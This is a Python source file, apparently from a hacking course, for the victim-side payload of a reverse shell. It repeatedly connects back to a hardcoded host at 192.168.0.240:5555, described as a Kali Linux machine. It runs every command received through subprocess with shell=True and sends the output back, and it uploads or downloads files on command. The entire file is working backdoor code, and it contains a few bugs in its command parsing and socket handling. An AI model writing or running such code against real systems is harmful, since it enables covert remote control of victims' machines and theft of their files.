from server import target_communication
import socket
import time 
import json
import subprocess # execute every command that server sends
import os

#takes data we are going to send
def reliable_send(data):
    jsondata=json.dumps(data) #store actual command
    s.send(jsondata.encode()) #send encoded data to target.
    pass


def reliable_recv():
    data= ''
    while True:
        try:
            #get 1024 bites from serrver
            data = data + s.recv(1024).decode().rstrip() #decode data
            return json.loads(data)
        except ValueError:
            continue 
pass


def move_to_different_directory(cmd):
    if cmd[1]=="..":
        path="/".join(os.getcwd().split("/")[:-1])
        os.chdir(path)
    else:
        path=cmd[1]
        os.chdir(cmd[1])
    reliable_send(path)
    

def download_file(file_name):
    f= open(file_name,"wb")
    s.settimeout(1) # set timeout so that the programm doesn't crash
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk=s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close
    pass


def upload_file(file_name):
    f=open(file_name,"rb")
    s.send(f.read())
    pass



#try to connect to kali linux machine
def connection():
    while True: 
        time.sleep(5)
        try:
            s.connect(("192.168.0.240",5555))
            shell()
            s.close
            break
        except:
            connection()


#work on received commands from server
def shell():
    while True:
        command = reliable_recv()

        if command== 'quit':
            break
        elif command=="whereami": # return to main directory
            reliable_send(os.getcwd())
            print("")
        elif command[:len("cd ")]=="cd ":
            #move_to_different_directory(cmd)
            os.chdir(command[3:]) #anything that surpasses "cd "
        elif command== "clear":
            pass
        elif command[:len("download ")]=="download":
            upload_file(command[len("upload "):])
            pass
        elif command[:len("upload ")]=="upload":
            download_file(command[len("download "):])
            pass
        else:
            execute= subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read() #gives output of cmd
            result= result.decode()
            print(result)
            reliable_send(result)

#first establish a connection between Payload and Server.
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection()